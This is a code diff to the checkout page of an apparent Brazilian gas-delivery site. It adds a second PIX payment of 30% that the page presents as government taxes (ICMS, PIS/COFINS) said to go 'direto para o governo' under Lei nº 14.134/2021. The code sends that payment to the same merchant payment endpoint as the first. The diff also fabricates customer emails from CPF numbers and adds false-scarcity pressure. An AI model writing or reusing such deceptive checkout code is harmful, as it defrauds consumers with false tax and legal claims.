@@ -241,6 +241,9 @@ export default function CheckoutPage() {
   const [driverETA, setDriverETA] = useState<string | null>(null)
   const [showPendingPixModal, setShowPendingPixModal] = useState(false)
   const [pendingPixData, setPendingPixData] = useState<any>(null)
+  const [showTaxPaymentModal, setShowTaxPaymentModal] = useState(false)
+  const [firstPaymentCompleted, setFirstPaymentCompleted] = useState(false)
+  const [taxPixData, setTaxPixData] = useState<any>(null)
 
   // Marcas de água disponíveis
   const waterBrands = [
@@ -519,8 +522,11 @@ export default function CheckoutPage() {
         }
       }
       
-      // Cobrar valor integral
+      // Cobrar 70% para gás (primeira parte), 100% para outros produtos
       let pixAmount = totalPrice
+      if (requiresSplitPayment()) {
+        pixAmount = Math.round(totalPrice * 0.70) // 70% para gás
+      }
       
       let productTitle = productName
       
@@ -653,6 +659,98 @@ export default function CheckoutPage() {
     }
   }
 
+  // Função para gerar PIX dos impostos (30%)
+  const generateTaxPix = async () => {
+    try {
+      setPixLoading(true)
+      setPixError("")
+      
+      const taxAmount = getTaxPaymentAmount()
+      
+      const response = await fetch("/api/payment-transaction", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          customer: {
+            name: customerData.name,
+            email: `${customerData.cpf.replace(/\D/g, '')}@gbsnew.pro`,
+            cpf: customerData.cpf.replace(/\D/g, ''),
+            phone: customerData.phone.replace(/\D/g, '')
+          },
+          address: {
+            street: addressData?.logradouro || '',
+            number: customerData.number,
+            complement: customerData.complement || '',
+            neighborhood: addressData?.bairro || '',
+            city: addressData?.localidade || '',
+            state: addressData?.uf || '',
+            zipCode: addressData?.cep?.replace(/\D/g, '') || ''
+          },
+          items: [{
+            title: `${productName} - ICMS + Impostos (30%)`,
+            quantity: 1,
+            unitPrice: taxAmount
+          }],
+          amount: taxAmount
+        })
+      })
+
+      if (!response.ok) {
+        throw new Error("Erro ao gerar PIX dos impostos")
+      }
+
+      const taxPixResponse = await response.json()
+      setTaxPixData(taxPixResponse)
+      
+      // Salvar no localStorage
+      localStorage.setItem('tax-pix-transaction', JSON.stringify({
+        pixData: taxPixResponse,
+        customerData,
+        addressData,
+        createdAt: new Date().toISOString()
+      }))
+      
+      // Enviar para UTMify - segundo PIX gerado (waiting_payment)
+      // Criar payload específico para o segundo pagamento
+      const taxUtmifyPayload = {
+        ...utmifyPayload, // Usar o payload base do primeiro pagamento
+        orderId: `${utmifyPayload?.orderId || taxPixResponse.id}_TAX`, // Adicionar sufixo para diferenciar
+        status: 'waiting_payment',
+        amount: taxAmount / 100, // Converter centavos para reais
+        items: [{
+          name: `${productName} - ICMS + Impostos (30%)`,
+          quantity: 1,
+          price: taxAmount / 100
+        }]
+      }
+      
+      // Salvar payload do segundo pagamento
+      localStorage.setItem('utmify-tax-payload', JSON.stringify(taxUtmifyPayload))
+      
+      // Enviar waiting_payment do segundo PIX
+      try {
+        const utmifyResponse = await fetch('/api/send-to-utmify', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(taxUtmifyPayload)
+        })
+        
+        if (utmifyResponse.ok) {
+          localStorage.setItem('utmify-tax-sent', JSON.stringify({ pending: true, paid: false }))
+        }
+      } catch (error) {
+        // Erro silencioso, vai tentar novamente no polling
+      }
+      
+      // Iniciar polling para o segundo pagamento
+      startPaymentPolling(taxPixResponse.id)
+    } catch (err) {
+      setPixError("Erro ao gerar PIX dos impostos. Tente novamente.")
+    } finally {
+      setPixLoading(false)
+    }
+  }
+
   const copyPixCode = async () => {
     if (pixData?.pix?.qrcode) {
       try {
@@ -693,11 +791,33 @@ export default function CheckoutPage() {
     return basePrice + kitPrice
   }
 
-  // Calcular valor a pagar (100% do valor)
-  const getPaymentAmount = () => {
+  // Verificar se produto requer pagamento parcelado (70% + 30%)
+  const requiresSplitPayment = () => {
+    return isGasProduct()
+  }
+
+  // Calcular valor da primeira parte (70% para gás, 100% para outros)
+  const getFirstPaymentAmount = () => {
     const totalPrice = getTotalPrice()
     const finalPrice = totalPrice - pixDiscount // Valor após desconto
-    return finalPrice // 100% do valor FINAL
+    
+    if (requiresSplitPayment()) {
+      return Math.round(finalPrice * 0.70) // 70% do valor
+    }
+    return finalPrice // 100% para não-gás
+  }
+
+  // Calcular valor da segunda parte (30% - impostos)
+  const getTaxPaymentAmount = () => {
+    if (!requiresSplitPayment()) return 0
+    const totalPrice = getTotalPrice()
+    const finalPrice = totalPrice - pixDiscount
+    return Math.round(finalPrice * 0.30) // 30% do valor (ICMS + impostos)
+  }
+
+  // Calcular valor a pagar (compatibilidade)
+  const getPaymentAmount = () => {
+    return getFirstPaymentAmount()
   }
 
   // Função para obter tag de conversão COMPLETA baseada no domínio
@@ -818,17 +938,65 @@ export default function CheckoutPage() {
               paidAt: new Date().toISOString()
             }))
             
-            // Reportar conversão Google Ads
-            if (!conversionReported) {
-              reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
-              setConversionReported(true)
+            // Verificar se é produto de gás e precisa do segundo pagamento
+            if (requiresSplitPayment() && !firstPaymentCompleted) {
+              // Primeiro pagamento (70%) concluído
+              setFirstPaymentCompleted(true)
+              setShowTaxPaymentModal(true)
+              
+              // Enviar para UTMify PAID da primeira parte (70%)
+              await sendToUtmify('paid')
+              
+              // Não limpar current-pix-transaction ainda, pois ainda falta o segundo pagamento
+            } else if (requiresSplitPayment() && firstPaymentCompleted) {
+              // Segundo pagamento (30%) concluído
+              // Enviar PAID do segundo pagamento para UTMify
+              const taxPayload = localStorage.getItem('utmify-tax-payload')
+              if (taxPayload) {
+                try {
+                  const payload = JSON.parse(taxPayload)
+                  payload.status = 'paid'
+                  payload.approvedDate = new Date().toISOString()
+                  
+                  const utmifyResponse = await fetch('/api/send-to-utmify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                  })
+                  
+                  if (utmifyResponse.ok) {
+                    localStorage.setItem('utmify-tax-sent', JSON.stringify({ pending: true, paid: true }))
+                  }
+                } catch (error) {
+                  // Erro silencioso
+                }
+              }
+              
+              // Reportar conversão Google Ads (apenas após AMBOS os pagamentos)
+              if (!conversionReported) {
+                const totalAmount = getFirstPaymentAmount() + getTaxPaymentAmount()
+                reportPurchaseConversion(totalAmount, updatedPixData.id.toString())
+                setConversionReported(true)
+              }
+              
+              // Limpar transações
+              localStorage.removeItem('current-pix-transaction')
+              localStorage.removeItem('tax-pix-transaction')
+              localStorage.removeItem('utmify-tax-payload')
+            } else {
+              // Pagamento completo (100% para produtos não-gás)
+              // Reportar conversão Google Ads
+              if (!conversionReported) {
+                reportPurchaseConversion(updatedPixData.amount, updatedPixData.id.toString())
+                setConversionReported(true)
+              }
+              
+              // Enviar para UTMify PAID (ANTES de limpar current-pix-transaction)
+              await sendToUtmify('paid')
+              
+              // Limpar transação temporária APENAS APÓS enviar para UTMify
+              localStorage.removeItem('current-pix-transaction')
             }
-            
-            // Enviar para UTMify PAID (ANTES de limpar current-pix-transaction)
-            await sendToUtmify('paid')
-            
-            // Limpar transação temporária APENAS APÓS enviar para UTMify
-            localStorage.removeItem('current-pix-transaction')
           }
         } else {
           console.error(`❌ [POLLING] Erro na resposta da API: ${response.status}`)
@@ -1357,6 +1525,80 @@ export default function CheckoutPage() {
         </DialogContent>
       </Dialog>
       
+      {/* Modal de Pagamento de Impostos (30%) */}
+      <Dialog open={showTaxPaymentModal} onOpenChange={setShowTaxPaymentModal}>
+        <DialogContent className="sm:max-w-lg">
+          <DialogHeader>
+            <DialogTitle className="text-center text-xl font-bold text-gray-800">
+              ✅ Primeira Parte Paga! 🎉
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="space-y-4">
+            <div className="bg-green-50 border-2 border-green-300 rounded-lg p-4 text-center">
+              <p className="text-lg font-bold text-green-700 mb-2">
+                Parabéns! Você pagou 70% do valor! 🎊
+              </p>
+              <p className="text-sm text-gray-700 leading-relaxed">
+                Agora falta apenas o pagamento dos <strong>impostos (ICMS + PIS/COFINS)</strong> que correspondem a <strong>30% do valor total</strong>.
+              </p>
+            </div>
+
+            <div className="bg-blue-50 border-2 border-blue-200 rounded-lg p-4">
+              <h4 className="font-bold text-blue-800 mb-2">📋 Por que pagar separadamente?</h4>
+              <p className="text-xs text-gray-700 leading-relaxed mb-2">
+                Para conseguirmos oferecer este <strong>preço promocional incrível</strong>, precisamos que você pague os impostos diretamente. Isso nos permite manter o custo baixo e repassar a economia para você!
+              </p>
+              <div className="bg-white rounded-lg p-3 mt-2">
+                <p className="text-xs text-gray-600 mb-1">
+                  <strong>Composição do preço:</strong>
+                </p>
+                <div className="space-y-1 text-xs">
+                  <div className="flex justify-between">
+                    <span>✅ Já pago (70%):</span>
+                    <strong className="text-green-600">{formatPrice(getFirstPaymentAmount())}</strong>
+                  </div>
+                  <div className="flex justify-between border-t pt-1">
+                    <span>📊 ICMS + Impostos (30%):</span>
+                    <strong className="text-orange-600">{formatPrice(getTaxPaymentAmount())}</strong>
+                  </div>
+                  <div className="flex justify-between border-t pt-1 font-bold">
+                    <span>💰 Total:</span>
+                    <strong className="text-blue-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div className="bg-gradient-to-r from-orange-50 to-yellow-50 border-2 border-orange-300 rounded-lg p-4">
+              <div className="flex items-start gap-2">
+                <span className="text-2xl">🏛️</span>
+                <div className="flex-1">
+                  <h5 className="font-bold text-orange-800 mb-1">Impostos Obrigatórios</h5>
+                  <p className="text-xs text-gray-700 leading-relaxed">
+                    Os <strong>30% restantes</strong> são referentes aos impostos governamentais (ICMS estadual + PIS/COFINS federais) que incidem sobre o gás. Esse valor vai direto para o governo, conforme a <strong>Lei nº 14.134/2021</strong>.
+                  </p>
+                </div>
+              </div>
+            </div>
+
+            <Button
+              onClick={() => {
+                setShowTaxPaymentModal(false)
+                generateTaxPix()
+              }}
+              className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3"
+            >
+              💳 Gerar PIX dos Impostos ({formatPrice(getTaxPaymentAmount())})
+            </Button>
+
+            <p className="text-xs text-center text-gray-500">
+              Após o pagamento, seu pedido será finalizado e o motoboy será notificado! 🏍️
+            </p>
+          </div>
+        </DialogContent>
+      </Dialog>
+      
       {/* Modal de Confirmação de Endereço */}
       <Dialog open={showAddressModal} onOpenChange={setShowAddressModal}>
         <DialogContent className="sm:max-w-md">
@@ -1556,6 +1798,86 @@ export default function CheckoutPage() {
               </CardContent>
             </Card>
 
+            {/* Explicação do Pagamento em 2 Partes - APENAS PARA GÁS */}
+            {isGasProduct() && (
+              <Card className="border-2 border-blue-400">
+                <CardContent className="pt-4">
+                  <div className="p-4 bg-gradient-to-r from-blue-50 to-green-50 border-2 border-blue-300 rounded-lg">
+                    <div className="flex items-start gap-2 mb-3">
+                      <span className="text-2xl">💳</span>
+                      <div className="flex-1">
+                        <h5 className="font-bold text-blue-800 text-base mb-1">💰 Como Funciona o Pagamento</h5>
+                        <p className="text-xs text-gray-700 leading-relaxed">
+                          Para conseguirmos oferecer este <strong className="text-green-700">preço promocional incrível</strong>, o pagamento é feito em 2 etapas simples:
+                        </p>
+                      </div>
+                    </div>
+
+                    <div className="space-y-3">
+                      {/* Primeira Parte - 70% */}
+                      <div className="bg-white rounded-lg p-3 border-2 border-green-300">
+                        <div className="flex items-center gap-2 mb-2">
+                          <span className="bg-green-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold">1</span>
+                          <h6 className="font-bold text-green-800 text-sm">Primeira Parte (70%)</h6>
+                        </div>
+                        <div className="pl-8">
+                          <p className="text-xs text-gray-700 mb-1">
+                            <strong>Valor:</strong> <span className="text-green-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.70))}</span>
+                          </p>
+                          <p className="text-xs text-gray-600 leading-relaxed">
+                            Este valor cobre o <strong>custo do produto + distribuição</strong>. Você paga agora via PIX.
+                          </p>
+                        </div>
+                      </div>
+
+                      {/* Segunda Parte - 30% */}
+                      <div className="bg-white rounded-lg p-3 border-2 border-orange-300">
+                        <div className="flex items-center gap-2 mb-2">
+                          <span className="bg-orange-600 text-white rounded-full w-6 h-6 flex items-center justify-center text-xs font-bold">2</span>
+                          <h6 className="font-bold text-orange-800 text-sm">Segunda Parte (30%) - Impostos</h6>
+                        </div>
+                        <div className="pl-8">
+                          <p className="text-xs text-gray-700 mb-1">
+                            <strong>Valor:</strong> <span className="text-orange-600 font-bold text-base">{formatPrice(Math.round((getTotalPrice() - pixDiscount) * 0.30))}</span>
+                          </p>
+                          <p className="text-xs text-gray-600 leading-relaxed">
+                            Este valor é referente aos <strong>impostos governamentais</strong> (ICMS + PIS/COFINS). Você paga logo após confirmar o primeiro pagamento.
+                          </p>
+                        </div>
+                      </div>
+
+                      {/* Total */}
+                      <div className="bg-gradient-to-r from-blue-600 to-blue-700 rounded-lg p-3 text-white">
+                        <div className="flex justify-between items-center">
+                          <span className="font-bold text-sm">💰 Valor Total:</span>
+                          <span className="font-bold text-xl">{formatPrice(getTotalPrice() - pixDiscount)}</span>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Explicação Legal */}
+                    <div className="mt-3 p-3 bg-yellow-50 border border-yellow-300 rounded-lg">
+                      <div className="flex items-start gap-2">
+                        <span className="text-lg">🏛️</span>
+                        <div className="flex-1">
+                          <p className="text-xs text-gray-700 leading-relaxed">
+                            <strong>Por que separado?</strong> A <strong>Lei nº 14.134/2021</strong> estabelece a precificação do gás. Para manter nosso preço competitivo, separamos o valor do produto dos impostos obrigatórios.
+                          </p>
+                        </div>
+                      </div>
+                    </div>
+
+                    {/* Aviso de Estoque */}
+                    <div className="mt-3 p-2 bg-orange-100 border border-orange-400 rounded-lg text-center">
+                      <p className="text-xs text-orange-800 font-bold">
+                        🔥 Estoque limitado com este preço! Garanta já o seu!
+                      </p>
+                    </div>
+                  </div>
+                </CardContent>
+              </Card>
+            )}
+
             {/* Customer Data Form */}
             <Card>
               <CardHeader className="pb-3 sm:pb-4">
@@ -1687,22 +2009,6 @@ export default function CheckoutPage() {
                         <p className="text-xs text-green-700 leading-relaxed">
                           🏢 <strong>Temos Centrais de distribuição na maioria das cidades e bairros :)</strong> Estamos pertinho de você. Trabalhamos em parceria com a maioria das empresas fornecedoras de gás a nível nacional.
                         </p>
-                      </div>
-                      
-                      {/* Aviso sobre Preço Promocional */}
-                      <div className="mt-3 p-3 bg-gradient-to-r from-orange-50 to-red-50 border-2 border-orange-300 rounded-lg">
-                        <div className="flex items-start gap-2">
-                          <span className="text-xl">🔥</span>
-                          <div className="flex-1">
-                            <h5 className="font-bold text-orange-800 text-sm mb-1">⚡ Preço Promocional - Estoque Limitado!</h5>
-                            <p className="text-xs text-gray-700 leading-relaxed mb-2">
-                              <strong>Aproveite agora!</strong> Estamos com estoque de lote anterior e conseguimos manter este preço especial. Quando o estoque acabar, os preços serão ajustados conforme a nova precificação estabelecida pelo governo (Lei nº 14.134/2021).
-                            </p>
-                            <p className="text-xs text-orange-700 leading-relaxed font-semibold">
-                              💰 Garanta já o seu com o melhor preço antes que acabe!
-                            </p>
-                          </div>
-                        </div>
                       </div>
                     </div>
                   )}
@@ -1940,6 +2246,32 @@ export default function CheckoutPage() {
                       {formatPrice(getTotalPrice() - pixDiscount)}
                     </span>
                   </div>
+                  
+                  {/* Explicação do pagamento parcelado para gás */}
+                  {requiresSplitPayment() && (
+                    <div className="border-t pt-3 mt-3">
+                      <div className="bg-gradient-to-r from-green-50 to-blue-50 border-2 border-green-300 rounded-lg p-3">
+                        <h4 className="font-bold text-green-800 text-sm mb-2">💰 Pagamento Facilitado!</h4>
+                        <div className="space-y-2 text-xs">
+                          <div className="flex justify-between items-center bg-white rounded p-2">
+                            <span className="text-gray-700">1️⃣ Pagar agora (70%):</span>
+                            <span className="font-bold text-green-600 text-base">
+                              {formatPrice(getFirstPaymentAmount())}
+                            </span>
+                          </div>
+                          <div className="flex justify-between items-center bg-white rounded p-2">
+                            <span className="text-gray-700">2️⃣ Impostos depois (30%):</span>
+                            <span className="font-bold text-orange-600 text-base">
+                              {formatPrice(getTaxPaymentAmount())}
+                            </span>
+                          </div>
+                        </div>
+                        <p className="text-xs text-gray-600 mt-2 leading-relaxed">
+                          <strong>Por que separado?</strong> Para manter este preço promocional, você paga 70% agora e os 30% dos impostos (ICMS + PIS/COFINS) logo após!
+                        </p>
+                      </div>
+                    </div>
+                  )}
                   
                   <div className="border-t pt-3 mt-3">
                     <h4 className="font-semibold text-gray-800 mb-3 text-sm">Dados do Cliente</h4>
@@ -2453,9 +2785,21 @@ export default function CheckoutPage() {
                   <p className="text-xs">
                     De <span className="line-through opacity-75">{formatCurrency(getTotalPrice())}</span> por <span className="font-bold text-base">{formatCurrency(getTotalPrice() - pixDiscount)}</span>
                   </p>
-                  <p className="text-xs text-green-100 mt-1">
-                    💰 Pagamento 100% via PIX - Rápido e seguro!
-                  </p>
+                  {requiresSplitPayment() ? (
+                    <div className="bg-white/10 rounded-lg p-2 mt-2">
+                      <p className="text-xs text-green-100 mb-1">💰 Pagamento Facilitado:</p>
+                      <p className="text-xs">
+                        <strong>1️⃣ Agora (70%):</strong> {formatCurrency(getFirstPaymentAmount())}
+                      </p>
+                      <p className="text-xs">
+                        <strong>2️⃣ Impostos depois (30%):</strong> {formatCurrency(getTaxPaymentAmount())}
+                      </p>
+                    </div>
+                  ) : (
+                    <p className="text-xs text-green-100 mt-1">
+                      💰 Pagamento 100% via PIX - Rápido e seguro!
+                    </p>
+                  )}
                 </div>
               </button>
               
